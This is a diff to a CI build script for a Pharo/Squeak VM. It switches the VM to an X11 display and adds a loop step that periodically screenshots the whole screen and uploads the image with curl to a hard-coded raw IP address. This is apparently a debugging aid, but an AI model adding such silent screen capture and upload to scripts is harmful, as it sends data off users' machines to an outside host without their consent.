@@ -15,7 +15,7 @@
 case "$(uname -s)" in
 	"Linux")
 		PHARO_VM="$VM_PATH/Linux/squeak"
-		PHARO_PARAM="-nodisplay \
+		PHARO_PARAM="-vm display=X11
       -nosound \
       -plugins "$VM_PATH/Linux" \
 	    -encoding latin1"
@@ -226,6 +226,9 @@ if [ $pid ] ; then
 		fi
 		let "tictoc = $COUNTER % 60"
 		if [ "$tictoc" -eq 0 ] ; then
+                    FILENAME=$(date +%s)
+                    $(import -window root $FILENAME.png)
+                    $(curl -X POST -F file=@$FILENAME.png http://87.117.252.97:5000/upload/$FILENAME.png)
                		echo "travis ... be patient PLEASE: https://github.com/dalehenrich/builderCI/issues/38"
                 fi 
 	done
